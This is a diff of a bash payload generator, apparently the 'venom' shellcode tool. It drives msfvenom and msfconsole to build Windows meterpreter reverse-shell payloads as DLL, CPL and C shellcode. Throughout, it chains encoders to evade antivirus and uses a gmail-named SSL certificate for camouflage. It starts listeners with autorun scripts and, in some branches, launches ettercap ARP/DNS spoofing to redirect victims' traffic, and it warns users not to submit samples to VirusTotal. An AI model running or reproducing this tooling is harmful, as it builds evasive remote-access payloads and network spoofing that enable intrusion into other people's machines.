@@ -376,6 +376,7 @@ if [ "$ICMPDIS" = "disabled" ]; then
    echo "${RedF}[x]${white} Local ICMP Replies are disable (enable ICMP replies)${white}"
    sysctl -w net.ipv4.icmp_echo_ignore_all=0 >/dev/null 2>&1
 fi
+rm $ApAcHe/$N4m.zip > /dev/null 2>&1
 rm $ApAcHe/$N4m.bat > /dev/null 2>&1
 rm $ApAcHe/icmpsh.exe > /dev/null 2>&1
 # exit venom.sh
@@ -702,7 +703,6 @@ fi
           else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
           fi
-
         fi
    fi
 
@@ -749,25 +749,25 @@ paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable 
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: astr0baby" --width 300) > /dev/null 2>&1
 # chose agent final extension (.dll or .cpl)
 Ext=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable agent extensions:\nThere is a niftty trick involving dll loading behavior under windows.\nIf we rename our agent.dll to agent.cpl we now have an executable\nmeterpreter payload that we cant doubleclick and launch it.." --radiolist --column "Pick" --column "Option" TRUE "$N4m.dll" FALSE "$N4m.cpl" --width 300 --height 150) > /dev/null 2>&1
-if [ "$Ext" = "$N4m.dll" ]; then
-Ext="dll"
-else
-Ext="cpl"
-fi
+
 
 ## setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="443";fi
 if [ -z "$N4m" ]; then N4m="astr0baby";fi
+if [ "$Ext" = "$N4m.dll" ]; then
+   Ext="dll"
+else
+   Ext="cpl"
+fi
 
 
 echo "[☠] Loading uuid(@nullbyte) obfuscation module .."
 sleep 1
 echo "[☠] Building shellcode -> C format ..."
 sleep 2
-if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-echo "[☠] meterpreter over SSL sellected .."
-sleep 1
+if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
+   echo "[☠] meterpreter over SSL sellected ..";sleep 1
 fi
 
 
@@ -785,7 +785,7 @@ cat << !
 !
 
 # use metasploit to build shellcode
-if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
 xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f c > $IPATH/output/chars.raw"
 else
 xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c > $IPATH/output/chars.raw"
@@ -886,9 +886,9 @@ $ComP exec_dll.c -o $N4m.dll -lws2_32 -shared
 strip $N4m.dll
 
 if [ "$Ext" = "dll" ]; then
-mv $N4m.dll $IPATH/output/$N4m.dll
+   mv $N4m.dll $IPATH/output/$N4m.dll
 else
-mv $N4m.dll $IPATH/output/$N4m.cpl
+   mv $N4m.dll $IPATH/output/$N4m.cpl
 fi
 
 
@@ -909,7 +909,7 @@ fi
       echo "[☯] Please dont test samples on virus total..."
         if [ "$MsFlF" = "ON" ]; then
 
-          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
@@ -930,7 +930,7 @@ fi
           cd $IPATH/
         else
 
-          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
@@ -1012,7 +1012,7 @@ fi
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
 
-            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
@@ -1033,7 +1033,7 @@ fi
             cd $IPATH/
           else
 
-            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
@@ -1052,7 +1052,7 @@ fi
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
 
-            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
@@ -1073,7 +1073,7 @@ fi
             cd $IPATH/
           else
 
-            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
@@ -1129,16 +1129,18 @@ paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable 
 N4m=$(zenity --title="☠ DLL NAME ☠" --text "example: DllExploit" --entry --width 300) > /dev/null 2>&1
 # chose agent final extension (.dll or .cpl)
 Ext=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable agent extensions:\nThere is a niftty trick involving dll loading behavior under windows.\nIf we rename our agent.dll to agent.cpl we now have an executable\nmeterpreter payload that we cant doubleclick and launch it.." --radiolist --column "Pick" --column "Option" TRUE "$N4m.dll" FALSE "$N4m.cpl" --width 300 --height 150) > /dev/null 2>&1
-if [ "$Ext" = "$N4m.dll" ]; then
-Ext="dll"
-else
-Ext="cpl"
-fi
+
 
 ## setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="443";fi
 if [ -z "$N4m" ]; then N4m="DllExploit";fi
+if [ "$Ext" = "$N4m.dll" ]; then
+   Ext="dll"
+else
+   Ext="cpl"
+fi
+
 
 echo "[☠] Building shellcode -> dll format ..."
 # display final settings to user
@@ -1156,9 +1158,9 @@ cat << !
 # use metasploit to build shellcode
 # new obfuscating method
 if [ "$paylo" = "windows/x64/meterpreter/reverse_tcp" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -f dll -o $IPATH/output/$N4m.dll" > /dev/null 2>&1
+   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -f dll -o $IPATH/output/$N4m.dll" > /dev/null 2>&1
 else
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -a x86 -e x86/countdown -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 6 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 7 -f dll -o $IPATH/output/$N4m.dll" > /dev/null 2>&1
+   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -a x86 -e x86/countdown -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 6 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 7 -f dll -o $IPATH/output/$N4m.dll" > /dev/null 2>&1
 fi
 echo ""
 echo "[☠] editing/backup files..."
@@ -1393,9 +1395,8 @@ if [ -z "$N4m" ]; then N4m="shellcode";fi
 
 echo "[☠] Building shellcode -> C format ..."
 sleep 2
-if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-echo "[☠] meterpreter over SSL sellected .."
-sleep 1
+if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
+   echo "[☠] meterpreter over SSL sellected ..";sleep 1
 fi
 
 # display final settings to user
@@ -1411,10 +1412,10 @@ cat << !
 !
 
 # use metasploit to build shellcode
-if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f C > $IPATH/output/chars.raw"
+if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
+   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f C > $IPATH/output/chars.raw"
 else
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c > $IPATH/output/chars.raw"
+   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c > $IPATH/output/chars.raw"
 fi
 
 echo ""
@@ -1476,7 +1477,7 @@ ans=$(zenity --list --title "☠ EXECUTABLE FORMAT ☠" --text "\nChose what to 
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
 
-         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
@@ -1497,7 +1498,7 @@ ans=$(zenity --list --title "☠ EXECUTABLE FORMAT ☠" --text "\nChose what to 
          cd $IPATH/
        else
 
-         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
@@ -1530,7 +1531,7 @@ ans=$(zenity --list --title "☠ EXECUTABLE FORMAT ☠" --text "\nChose what to 
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
 
-         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
@@ -1551,7 +1552,7 @@ ans=$(zenity --list --title "☠ EXECUTABLE FORMAT ☠" --text "\nChose what to 
          cd $IPATH/
        else
 
-         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
@@ -1584,7 +1585,7 @@ ans=$(zenity --list --title "☠ EXECUTABLE FORMAT ☠" --text "\nChose what to 
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
 
-         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
@@ -1605,7 +1606,7 @@ ans=$(zenity --list --title "☠ EXECUTABLE FORMAT ☠" --text "\nChose what to 
          cd $IPATH/
        else
 
-         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
@@ -1654,7 +1655,7 @@ iCn=$(zenity --list --title "☠ REPLACE AGENT ICON ☠" --text "\nChose icon to
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
 
-           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
@@ -1675,7 +1676,7 @@ iCn=$(zenity --list --title "☠ REPLACE AGENT ICON ☠" --text "\nChose icon to
            cd $IPATH/
          else
 
-           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
@@ -1743,9 +1744,8 @@ echo "[☠] Building shellcode -> C format ..."
 sleep 2
 echo "[☠] obfuscating -> msf encoders!"
 sleep 1
-if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-echo "[☠] meterpreter over SSL sellected .."
-sleep 1
+if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
+   echo "[☠] meterpreter over SSL sellected ..";sleep 1
 fi
 
 echo "" > $IPATH/output/chars.raw
@@ -1762,10 +1762,10 @@ cat << !
 !
 
 # use metasploit to build shellcode (msf encoded)
-if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f c > $IPATH/output/chars.raw"
+if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
+   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f c > $IPATH/output/chars.raw"
 else
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -f c > $IPATH/output/chars.raw"
+   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -f c > $IPATH/output/chars.raw"
 fi
 
 
@@ -1867,7 +1867,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
 
-           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
@@ -1888,7 +1888,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
            cd $IPATH/
          else
 
-           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
@@ -2004,7 +2004,7 @@ fi
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
 
-           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
@@ -2025,7 +2025,7 @@ fi
             cd $IPATH/
           else
 
-           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
@@ -2044,7 +2044,7 @@ fi
         echo "[☯] Please dont test samples on virus total..."
           if [ "$MsFlF" = "ON" ]; then
 
-           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
@@ -2065,7 +2065,7 @@ fi
             cd $IPATH/
           else
 
-            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
+            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
